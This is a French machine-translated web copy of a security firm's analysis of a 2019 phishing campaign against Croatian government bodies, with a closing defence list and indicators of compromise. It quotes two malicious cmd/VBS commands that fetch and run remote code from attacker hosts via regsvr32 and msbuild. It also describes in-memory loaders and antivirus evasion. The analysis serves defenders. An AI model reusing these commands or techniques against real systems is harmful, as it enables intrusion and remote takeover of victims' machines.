<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üõÅ ü§πüèø üë©‚Äç‚öïÔ∏è IronPython du c√¥t√© du mal: comment nous avons d√©couvert une cyberattaque sur les services publics dans un pays europ√©en üéÖüèø ‚≠êÔ∏è üë©üèø‚Äçüé®</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Nos experts du centre de s√©curit√© expert se tiennent toujours au courant et surveillent l'√©mergence de nouvelles menaces int√©ressantes et dangereuses....">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>IronPython du c√¥t√© du mal: comment nous avons d√©couvert une cyberattaque sur les services publics dans un pays europ√©en</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/458766/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="image"></a> <br><br>  Nos experts du centre de s√©curit√© expert se tiennent toujours au courant et surveillent l'√©mergence de nouvelles menaces int√©ressantes et dangereuses.  C'est ainsi que, d√©but avril 2019, une attaque cibl√©e contre le gouvernement croate a √©t√© d√©couverte.  Ce rapport a examin√© la cha√Æne de diffusion des logiciels malveillants sur l'ordinateur de la victime, a pr√©sent√© des indicateurs de compromis et a not√© l'utilisation d'un nouveau cadre post-op√©rationnel, qui, selon nos donn√©es, n'a jamais √©t√© utilis√© par les attaquants. <a name="habracut"></a><br><br><h2>  Infection de la victime </h2><br>  Le 2 avril 2019, lors d'une surveillance de routine de diverses ressources pour de nouveaux logiciels malveillants, les experts de PT Expert Security Center ont d√©couvert un document de bureau inhabituel. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/719/16e/e61/71916ee61f47e529490f3da0ca0db121.png" alt="image"><br><br>  <i>Figure 1. Document malveillant</i> <br><br>  La notification d'envoi a √©t√© cr√©√©e dans l'application MS Excel Office et enregistr√©e dans l'ancien format XLS un jour plus t√¥t (2019-04-01 16:28:07 (UTC)).  N√©anmoins, l'horodatage disponible sur la presse (2018-07-25 00:12:30 (UTC)) indique que le document a √©t√© utilis√© en 2018.  Nous reviendrons sur ce sympt√¥me indirect ci-dessous. <br><br>  Il est √† noter que le champ Commentaires (qui peut √™tre modifi√©, y compris √† l'aide de l'application MS Excel) contient une commande dans le shell Windows: <br><br><pre><code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>): objShell.Run <span class="hljs-string"><span class="hljs-string">"net use https://postahr.vip"</span></span>, 0, False: Wscript.Sleep 10000: objShell.Run <span class="hljs-string"><span class="hljs-string">"regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct scrobj.dll"</span></span>, 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/557/a53/082/557a53082352f47cc4c079305408a7cc.png" alt="image"><br><br>  <i>Figure 2. Le champ "Commentaires" avec un contenu suspect</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a93/f80/6e8/a93f806e8dca3dfb1a81ee0da457da95.png" alt="image"><br><br>  <i>Figure 3. Le contenu du champ Commentaires sous forme binaire</i> <br><br>  √Ä la suite de l'ex√©cution de cette commande, le syst√®me cr√©e un script dans le langage Visual Basic qui, une fois lanc√©, effectuera les actions suivantes: <br><br><ul><li>  connecter une ressource r√©seau √† l'aide de la technologie WebDAV, </li><li>  t√©l√©chargez et ex√©cutez le fichier de la prochaine √©tape d'infection √† l'aide de l'utilitaire syst√®me l√©gitime regsvr32. </li></ul><br>  Lorsqu'une ressource r√©seau est connect√©e via HTTP (S), une requ√™te NTLM est envoy√©e au serveur attaquant, avec laquelle le hachage NTLM peut √™tre restaur√©.  Ensuite, le hachage re√ßu peut √™tre utilis√© pour l'autorisation sur les services au nom de la victime.  Nous n'avons trouv√© aucune trace de telles attaques, et les raisons de la connexion d'une ressource r√©seau restent floues. <br><br>  La technique d'utilisation de regsvr32 (gestion des contr√¥les ActiveX) √† des fins malveillantes n'est pas nouvelle et a m√™me un nom - Squiblydoo.  Les attaquants l'utilisent pour se conformer aux exigences de contr√¥le du lancement de programmes de confiance, ainsi que pour contourner la d√©tection antivirus. <br><br>  En soi, le texte du champ Commentaires est inoffensif et son ex√©cution doit √™tre en quelque sorte conditionn√©e.  Lorsque la victime ouvre le document Excel re√ßu, un message d'interruption en langue croate s'affiche qui vous indique d'inclure des macros: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/97d/8a4/b5a/97d8a4b5a0406ebef6d02ea3c8b1b994.png" alt="image"><br><br>  <i>Figure 4. Message d'interruption apr√®s l'ouverture d'un document</i> <br><br>  Si les macros sont autoris√©es, l'utilisateur verra une fausse notification de colis avec le logo postal croate: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d64/2d3/1e2/d642d31e23e0d4fa7ca34dc652ad522b.png" alt="image"><br><br>  <i>Figure 5. Notification de faux paquet</i> <br><br>  Pendant ce temps, √† l'aide des outils de macro, le script du champ Commentaires sera ex√©cut√© et le script cr√©√© dans le syst√®me sera ajout√© au d√©marrage: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/678/7ab/4aa/6787ab4aab57ef3ad22b190c2474f8c5.png" alt="image"><br><br>  <i>Figure 6. Macro logique cl√©</i> <br><br>  Curieusement, le script en cours de cr√©ation n'est pas d√©clench√© par une macro.  C'est peut-√™tre l'intention de l'attaquant: la prochaine √©tape de l'infection se produira apr√®s un red√©marrage du syst√®me et une connexion utilisateur.  Nous reviendrons sur ce d√©tail ci-dessous. <br><br>  Une partie du sc√©nario est int√©ressante √† sa mani√®re: une structure de code soign√©e avec formatage, indentation et autres nuances de balisage peut √™tre un signe d'utilisation de code tiers et m√™me un programme qui vous permet de cr√©er automatiquement de tels documents. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ba4/e7c/2cc/ba4e7c2ccb1eeb9bb4a2de8dbf8dda13.png" alt="image"><br><br>  <i>Figure 7. Partie vraisemblablement emprunt√©e de la macro</i> <br><br>  La recherche par mot-cl√© fournit de nombreux morceaux de code similaires sur diff√©rentes ressources.  Nous sommes enclins √† croire que le pirate a simplement trouv√© le code de programme appropri√© et l'a l√©g√®rement modifi√© pour effectuer les actions dont il avait besoin: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/899/608/9fc/8996089fca65afdf132c69c6d943a6fa.png" alt="image"><br><br>  <i>Figure 8. Exemple d'une macro similaire sur issuu.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fa5/c22/3f6/fa5c223f681efa6950cb71067f26c877.png" alt="image"><br><br>  <i>Figure 9. Exemple d'une macro similaire sur stackoverflow.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/1dd/bdb/f59/1ddbdbf592989692bc8d15712f638f37.png" alt="image"><br><br>  <i>Figure 10. Exemple d'une macro similaire sur dummies.com</i> <br><br>  Revenons √† l'√©tape suivante de l'infection √† l'aide de l'utilitaire regsvr32.  Lorsque la commande est ex√©cut√©e, le scriptlet update.sct en JavaScript sera t√©l√©charg√© depuis le serveur de l'attaquant.  Le corps du script contient des donn√©es binaires encod√©es par l'algorithme Base64.  Apr√®s d√©codage, les donn√©es re√ßues seront d√©s√©rialis√©es et ex√©cut√©es √† l'aide de la plate-forme logicielle .NET Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e0/d7d/9f8/0e0d7d9f8b6324b3aadce5a203d28075.png" alt="image"><br><br>  <i>Figure 11. Le script update.sct t√©l√©charg√© depuis le serveur de l'attaquant</i> <br><br>  Il est √† noter que ce code a √©galement √©t√© emprunt√© par l'attaquant sur l'une des ressources publiques: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b26/b9c/673/b26b9c673c0aace886123fc47b3d70c4.png" alt="image"><br><br>  <i>Figure 12. Un exemple de code similaire sur rastamouse.me</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/25e/5ec/aef/25e5ecaeff7cebf201d5781fb8423ddc.png" alt="image"><br><br>  <i>Figure 13. Un exemple de code similaire sur github.com</i> <br><br>  Il ne semble pas que le pirate ait soigneusement fouill√© la logique des outils utilis√©s.  Par exemple, dans le scriptlet consid√©r√©, la fonction setversion est appel√©e, ce qui ne fait rien.  Un exemple disponible sur le Web semble √©galement. <br><br>  L'objet d√©compress√© et lanc√© est un fichier PE ex√©cutable sur la plate-forme .NET. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/20f/274/650/20f274650305046ab50359cd089a517d.png" alt="image"><br><br>  <i>Figure 14. En-t√™te du fichier PE ex√©cutable</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/cf6/946/d54/cf6946d543b6b8a02f79bc06b3470d7e.png" alt="image"><br><br>  <i>Figure 15. Informations de d√©bogage du fichier SharpPick PE</i> <br><br>  √Ä la suite de la compilation, le chemin d'acc√®s au projet avec le code source a √©t√© conserv√©.  Le suffixe -master indique que le projet a √©t√© pr√©c√©demment clon√© √† partir du r√©f√©rentiel, et le r√©pertoire SharpPick conduit √† une application bien connue qui vous permet de t√©l√©charger et d'ex√©cuter du code PowerShell sans utiliser directement l'interpr√©teur de langage, mais en utilisant les d√©pendances .NET. <br>  Malgr√© la disponibilit√© du projet d'utilitaire SharpPick sur GitHub, vous devez vous assurer qu'aucun changement significatif n'a √©t√© apport√©. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/300/f5f/689/300f5f689737fae0872ddaaaec6d5fbc.png" alt="image"><br><br>  <i>Figure 16. Partie du code utilitaire SharpPick d√©compil√©</i> <br><br>  √Ä la suite de la d√©compilation, un pseudo-code a √©t√© obtenu, au cours duquel il est d√©cod√© √† partir de Base64 et le script PowerShell est lanc√©: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fd7/9c0/dae/fd79c0dae768b4bc3e6bd8916b871c4a.png" alt="image"><br><br>  <i>Figure 17. Script PowerShell partiellement converti</i> <br><br>  Apr√®s avoir simplifi√© le code, il n'est pas difficile d'analyser sa logique: <br><br><ul><li>  un objet est form√© pour interagir avec le serveur Web avec les param√®tres d'agent utilisateur, de cookie et de proxy sp√©cifi√©s; </li><li>  la charge utile est charg√©e √† l'adresse sp√©cifi√©e; </li><li>  le r√©sultat est d√©crypt√© par l'algorithme RC4 √† l'aide de la cl√© sp√©cifi√©e et d√©marr√©. </li></ul><br>  Malheureusement, lors de nos recherches, le serveur de gestion √©tait d√©j√† indisponible.  Les donn√©es qui ont √©t√© re√ßues de lui plus t√¥t, nous n'avons pas pu les trouver.  Cependant, cette fois, il y a suffisamment d'informations sur le Web (exemple: rapport de nos coll√®gues de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://www.google.com/url%3Fq%3D">FireEye</a> ) pour √©tablir sans ambigu√Øt√©: le maillon final de cette cha√Æne d'infection est Empire backdoor, un outil pour l'administration √† distance de l'ordinateur de la victime dans le cadre du cadre post-op√©rationnel d'Empire Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b7e/a88/eab/b7ea88eab8ddfb21880d2f2a8b04f51d.png" alt="image"><br><br>  <i>Figure 18. Utilisation d'un script PowerShell similaire pour attaquer des vuln√©rabilit√©s dans WinRAR</i> <br><br>  Fait int√©ressant, d'autres mod√®les de script conduisent √† un article complet sur les techniques de test de p√©n√©tration avec une attention particuli√®re pour cacher l'infrastructure des attaquants derri√®re les serveurs proxy.  La source d'informations la plus probable utilis√©e par l'attaquant est un article de coll√®gues de Payatu Technologies, o√π ils <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://www.google.com/url%3Fq%3D">fournissent</a> des instructions d√©taill√©es sur la redirection des sessions vers des ressources l√©gitimes, le blocage des paquets ind√©sirables, la journalisation, etc., y compris en utilisant Empire. <br><br>  Quelques heures plus tard, nous avons trouv√© un autre document sur le colis.  Il pr√©sente de nombreuses similitudes avec le pr√©c√©dent: √©galement trouv√© en Croatie (2019-04-02 16:52:56 (UTC)), a le m√™me nom et m√™me une image pi√®ge sur le colis re√ßu.  Mais il y a toujours des diff√©rences. <br><br>  Le code malveillant se trouve √† nouveau dans le champ Commentaires, mais cette fois la logique des actions a √©t√© modifi√©e. <br><br><pre> <code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>):objShell.Run <span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe /c net use \\176.105.255.59\webdav"</span></span>,0:Wscript.Sleep 60000: objShell.Run <span class="hljs-string"><span class="hljs-string">"%windir%\Microsoft.Net\Framework\v4.0.30319\msbuild.exe \\176.105.255.59\webdav\msbuild.xml"</span></span> , 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><ul><li>  La ressource r√©seau est connect√©e √† l'aide du protocole SMB. </li><li>  T√©l√©chargez et lancez la prochaine √©tape d'infection √† l'aide de msbuild, un utilitaire l√©gitime du package .NET Framework. </li></ul><br>  Il est int√©ressant de noter que la ligne webdav est pr√©sente dans l'adresse du r√©pertoire mont√©, reliant indirectement ce cas au pr√©c√©dent.  Cette fois, une attaque sur le hachage NTLM est toujours possible, bien qu'il n'y ait aucune preuve de son utilisation.  Encore une fois, une application l√©gitime (cette fois msbuild) est utilis√©e pour contourner avec succ√®s la restriction sur le lancement de programmes tiers.  Avant de d√©crire la technique de l'abus, nous mentionnons les diff√©rences dans le code de programme de la macro d'un nouveau document. <br><br>  Les attaquants n'ont pas apport√© de modifications importantes √† la logique du script VBA.  Mais il convient de noter que cette fois, ils fournissent non seulement le chargement automatique du script VBS cr√©√© dans le syst√®me, mais le lancent √©galement √† l'ouverture du document.  Tr√®s probablement, dans le cas pr√©c√©dent, les attaquants l'ont simplement oubli√©, et apr√®s un certain temps, ayant d√©couvert une erreur, ils l'ont corrig√©e dans la nouvelle version du document. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/77d/670/2b3/77d6702b3bc07650a4f462b62cf975fd.png" alt="image"><br><br>  <i>Figure 19. Comparaison du code macro dans deux documents</i> <br><br>  La prochaine √©tape de l'infection est un document XML qui contient du code C #.  Une fonctionnalit√© de l'utilitaire msbuild vous permet de compiler et d'ex√©cuter le code contenu √† la vol√©e, comme en t√©moignent les commentaires laiss√©s par le pirate au d√©but du balisage. <br><br>  Le tampon Base64 est √† nouveau pr√©sent√© dans le code, qui sera d√©cod√©, d√©compress√© par l'algorithme Deflate et lanc√©.  Nous pensons que le lecteur est d√©j√† conscient que cette fois l'attaquant a √©galement utilis√© un mod√®le librement accessible, comme en t√©moignent les commentaires mentionn√©s et de nombreuses sources sur le Web avec le m√™me code. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d68/6ea/4ac/d686ea4acff8cb52067c0c53cb6bf749.png" alt="image"><br><br>  <i>Figure 20. La t√¢che msbuild.xml t√©l√©charg√©e depuis le serveur attaquant</i> <br><br>  Par cons√©quent, cette fois, un fichier PE sur la plate-forme .NET sera charg√© et ex√©cut√© en m√©moire.  Et les informations de d√©bogage contiennent non seulement un signe que le projet a √©t√© collect√© sur une machine virtuelle (√©ventuellement pour cacher des informations sur l'attaquant), mais aussi le r√©pertoire SILENTTRINITY, sur lequel nous nous attarderons plus en d√©tail. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/adf/3fe/653/adf3fe65355eb2c7418a5438afc5aa34.png" alt="image"><br><br>  <i>Figure 21. Informations de d√©bogage du fichier SILENTTRINITY PE</i> <br><br>  Apr√®s avoir √©tudi√© ces deux documents de colis, nous en avons trouv√© deux autres.  Le format de fichier, le nom et l'image d'interruption avec la r√©gion sp√©cifi√©e sont rest√©s inchang√©s.  Des documents √©taient disponibles fin ao√ªt 2018, ce qui confirme l'hypoth√®se de long terme de la campagne, dont nous parlions au d√©but du rapport. <br><br>  Il est curieux que l'an dernier, les pirates n'aient pas utilis√© le champ "Commentaires", mais ils ont lanc√© des utilitaires l√©gitimes.  Le composant malveillant a √©t√© charg√© √† l'aide de l'utilitaire pour travailler avec des certificats et des op√©rations cryptographiques certutil, et le lancement a √©t√© fourni par les outils de gestion du syst√®me WMI: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95b/f2f/5a9/95bf2f5a9dc3693dd275bc9153e2a364.png" alt="image"><br><br>  <i>Figure 22. Comparaison des macros de document 2018</i> <br><br>  Malheureusement, apr√®s la limitation de ce qui s'est pass√©, nous n'avons pas pu √©tablir les liens suivants dans la cha√Æne d'attaque de 2018. <br><br>  Il convient √©galement de noter qu'une partie du code du script VBA est rest√©e inchang√©e, √† l'exception des commentaires auxiliaires supprim√©s expliquant la logique du travail. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ef4/16b/9ee/ef416b9ee48a47b9795cf24db66b7555.png" alt="image"><br><br>  <i>Figure 23. Comparaison des macros 2019 et 2018</i> <br><br><h2>  Cadre SilentTrinity </h2><br>  Les r√©sultats de recherche du mot cl√© SILENTTRINITY √† partir des informations de d√©bogage du fichier PE peuvent facilement d√©terminer l'origine de ce lien d'attaque.  En octobre 2018, Marcello Salvati (chercheur √† Black Hills Information Security) a publi√© un projet appel√© SILENTTRINITY sur le populaire r√©f√©rentiel GitHub.  L'id√©e principale: utiliser la flexibilit√© et les avantages du framework PowerShell post-op√©rationnel bien connu dans le langage de programmation Python Python, √† savoir IronPython.  Le projet se d√©veloppe √† ce jour. <br><br>  Nous ne nous attarderons pas sur les d√©tails du travail et de la mise en ≈ìuvre du projet (d'autant plus que l'auteur en a parl√© en d√©tail dans son <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://www.google.com/url%3Fq%3D">rapport</a> ).  Nous ne soulignerons que la logique de base du travail et les points int√©ressants de la mise en ≈ìuvre. <br><br>  Apr√®s avoir d√©marr√© le fichier PE (cependant, le lien interm√©diaire peut √™tre dans un format diff√©rent), les √©v√©nements suivants se produisent: <br><br><ul><li>  acc√®s au serveur de gestion pour t√©l√©charger l'archive ZIP avec les d√©pendances n√©cessaires et le script Python principal; </li><li>  le contenu des archives est extrait sans √™tre enregistr√© sur le disque; </li><li>  les d√©pendances sont enregistr√©es pour un traitement r√©ussi des scripts Python; </li><li>  Le script Python principal est lanc√©, attendant la t√¢che de l'attaquant; </li><li>  chaque t√¢che est transf√©r√©e en tant que script Python pr√™t √† l'emploi; </li><li>  la t√¢che est effectu√©e du c√¥t√© de la victime dans un fil distinct; </li><li>  le r√©sultat du travail est retransf√©r√© au serveur de gestion. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/ed9/250/ca2/ed9250ca2557c5f70ff18d60c33f1b31.png" alt="image"><br><br>  <i>Figure 24. Diagramme de fonctionnement du framework SilentTrinity</i> <br><br>  Parmi les fonctionnalit√©s, il convient de souligner les suivantes: <br><br><ul><li>  Prise en charge d'IronPython, y compris le langage Boo (un sous-ensemble d'IronPython avec un fort typage des donn√©es). </li><li>  Toute activit√© ne n√©cessite pas d'espace disque: les d√©pendances, les scripts, les t√¢ches sont situ√©s en m√©moire (attaque sans fichier). </li><li>  Archive avec d√©pendances, t√¢ches, r√©sultat du travail des √©quipes - toute communication entre la victime et le pirate est crypt√©e avec l'algorithme AES. </li><li>  La cl√© partag√©e est g√©n√©r√©e par le protocole Diffie-Hellman. </li><li>  Le transport r√©seau est fourni au niveau du protocole HTTP (S) avec prise en charge proxy. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="image"><br><br>  <i>Figure 25. Exemple d'interface utilisateur c√¥t√© serveur du framework SilentTrinity</i> <br><br>  Fait int√©ressant, le jour des attaques, le chargeur PE a √©t√© t√©l√©charg√© sur le service VirusTotal, o√π aucun fournisseur d'antivirus ne l'a identifi√© comme malveillant.  Cela n'est pas surprenant: premi√®rement, le fichier binaire ne parvient pas au disque et la d√©tection de signature n'a pas beaucoup de sens;  d'autre part, la d√©tection statique est loin d'√™tre la seule technologie de protection des utilisateurs. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d24/126/15c/d2412615ccb6eadccf22c7bec91aa7ec.png" alt="image"><br><br>  <i>Figure 26. R√©sultat de l'analyse du chargeur de d√©marrage SilentTrinity le jour de l'attaque</i> <br><br>  De plus, quelques jours apr√®s l'attaque, des verdicts de d√©tection ont commenc√© √† appara√Ætre.  Il est important que pendant la p√©riode des attaques, soit l'√©quipement de protection n'√©tait pas encore √©quip√© d'algorithmes de d√©tection, soit la menace n'√©tait pas connue en principe. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e6e/3f2/9d9/e6e3f29d93ff8aa9053c3e7dc4ac30ce.png" alt="image"><br><br>  <i>Figure 27. R√©sultat d'analyse en cours du chargeur de d√©marrage SilentTrinity</i> <br><br>  C'est probablement la raison pour laquelle cette solution a √©t√© choisie pour mener des attaques.  Nous n'avons aucune information selon laquelle le framework SilentTrinity a d√©j√† √©t√© utilis√© dans des attaques malveillantes auparavant. <br><br>  Infrastructure utilis√©e par les attaquants <br><br>  Il convient de mentionner que l'infrastructure r√©seau utilis√©e par les pirates est chronologiquement li√©e aux attaques en cours. <br><br><img src="https://habrastorage.org/webt/9u/uq/ug/9uuqugtgx2tbnobx9tjhadnbldk.png"><br><br>  <i>Tableau 1. Informations sur les domaines utilis√©s comme serveurs attaquants</i> <i><br></i> <br><br>  Les domaines ont √©t√© cr√©√©s de mani√®re √† ressembler √† des ressources attaqu√©es l√©gitimes.  Cela permet aux utilisateurs de gagner la confiance dans les attaques de phishing.  Notez que les ressources impliqu√©es ne sont pas limit√©es √† la Croatie. <br><br>  Tous les domaines sont enregistr√©s √† l'aide de la technologie de s√©curit√© WhoisGuard.  Il vous permet de masquer les vraies informations sur le titulaire du domaine afin de se prot√©ger contre le spam, tandis que les attaquants utilisent cette technologie pour l'anonymisation. <br><br>  Des serveurs distribuant et g√©rant des logiciels malveillants ont √©t√© lou√©s aupr√®s du fournisseur n√©erlandais Breezle. <br><br>  Toutes les informations disponibles sur les n≈ìuds, les adresses et les domaines des attaquants avec beaucoup de connexions entre eux nous permettent de juger des volumes importants de logiciels malveillants que les attaquants avaient cette fois.  Nous n'excluons pas que, dans la campagne, des outils similaires √† ceux envisag√©s puissent √™tre utilis√©s et certains cas d'infection restent non r√©solus. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/88d/308/4a4/88d3084a4fdcc666d13cb22d0f7ca88a.png" alt="image"><br><br>  <i>Figure 28. Repr√©sentation graphique de l'infrastructure d'un attaquant</i> <br><br><h2>  Conclusion </h2><br>  Un jour apr√®s la d√©couverte des documents dans les <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://www.google.com/url%3Fq%3D">nouvelles</a> , un communiqu√© de presse a √©t√© publi√© avec un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://www.google.com/url%3Fq%3D">lien</a> vers le D√©partement croate de la s√©curit√© des syst√®mes d'information concernant des attaques de phishing cibl√©es.  Des traces ont √©t√© trouv√©es dans plusieurs organes gouvernementaux du pays.  Il est signal√© que des e-mails ont √©t√© envoy√©s aux victimes avec un lien vers un site de phishing √† partir duquel il a √©t√© propos√© de t√©l√©charger un document malveillant √† partir duquel notre analyse a commenc√©.  Cela remplit les maillons manquants dans la cha√Æne d'attaque, et √† la fin nous aimerions pr√™ter attention aux m√©thodes de protection qui peuvent r√©duire les dommages caus√©s par de telles attaques: <br><br><ul><li>  Surveillance et contr√¥le de l'utilisation de certains programmes de confiance (certutil, regsvr32, msbuild, net, wmic ...) </li><li>  V√©rifier et analyser non seulement les pi√®ces jointes dans les e-mails, mais √©galement les liens Web </li><li>  Analyses p√©riodiques de la m√©moire PC sur un r√©seau d'entreprise </li><li>  Les connexions r√©ussies √† la C2 Silent Trinity (m√™me sous TLS) peuvent √™tre d√©tect√©es √† l'aide de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PT Network Attack Discovery</a> . De plus, dans <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">notre r√©f√©rentiel, nous avons publi√© des d√©tections pour la communaut√©.</a> </li></ul><br>  <b>Publi√© par</b> Alexey Vishnyakov, Positive Technologies <br><br>  PS Sur ce sujet, l'auteur a √©galement lu un rapport lors des Positive Hack Days 9. La vid√©o de cette pr√©sentation et d'autres est disponible sur: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.phdays.com/en/broadcast/</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Indicateurs de compromis:</b> <div class="spoiler_text">  0adb7204ce6bde667c5abd31e4dea164 <br>  13db33c83ee680e0a3b454228462e73f <br>  78184cd55d192cdf6272527c62d2ff89 <br>  79e72899af1e50c18189340e4a1e46e0 <br>  831b08d0c650c8ae9ab8b4a10a199192 <br>  92530d1b546ddf2f0966bbe10771521f <br>  c84b7c871bfcd346b3246364140cd60f <br>  hxxps: //postahr.vip/page/1/update.sct <br>  hxxps: //posteitaliane.live/owa/mail/archive.srf <br>  hxxps: //konzum.win/bat3.txt <br>  hxxp: //198.46.182.158/bat3.txt <br>  hxxps: //176.105.255.59: 8089 <br>  [\\] 176.105.255.59 \ webdav \ msbuild.xml <br>  postahr.online <br>  176.105.254.52 <br>  93.170.105.32 </div></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr458766/">https://habr.com/ru/post/fr458766/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr458752/index.html">Tic Tac Toe Partie 1: Svelte et Canvas 2D</a></li>
<li><a href="../fr458754/index.html">GPS pour le col√©opt√®re: syst√®me d'orientation multimodal</a></li>
<li><a href="../fr458758/index.html">La splendeur et la pauvret√© de la litt√©rature traduite</a></li>
<li><a href="../fr458760/index.html">L'exposition de Las Vegas s'adresse aux d√©veloppeurs d'√©lectronique et non aux consommateurs. Un rapport de la conf√©rence Design Automation</a></li>
<li><a href="../fr458764/index.html">Pratiques de base agiles pour les √©quipes techniques et non techniques en 2019</a></li>
<li><a href="../fr458768/index.html">5-6 raisons de venir √† GolangConf</a></li>
<li><a href="../fr458770/index.html">Toute la v√©rit√© sur RTOS. Article # 29. Interruptions dans Nucleus SE</a></li>
<li><a href="../fr458774/index.html">SGBD fonctionnel</a></li>
<li><a href="../fr458778/index.html">Satellite 6.5 Reporting Engine: quoi et pourquoi</a></li>
<li><a href="../fr458782/index.html">Adaptation de programmes pour ZX Spectrum √† TR-DOS par des moyens modernes. 3e partie</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
